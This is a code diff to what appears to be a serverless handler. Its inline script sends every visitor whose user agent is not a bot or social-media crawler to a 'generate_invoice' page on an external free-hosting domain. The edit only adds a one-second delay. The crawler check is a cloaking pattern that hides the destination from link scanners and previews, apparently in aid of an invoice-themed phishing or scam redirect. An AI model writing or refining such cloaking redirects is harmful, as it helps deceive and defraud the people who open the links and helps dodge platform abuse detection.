@@ -22,7 +22,9 @@ module.exports = (req, res) => {
         
         <script>
           if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
-            window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
+            setTimeout(function() {
+              window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
+            }, 1000);
           }
         </script>
       </head>
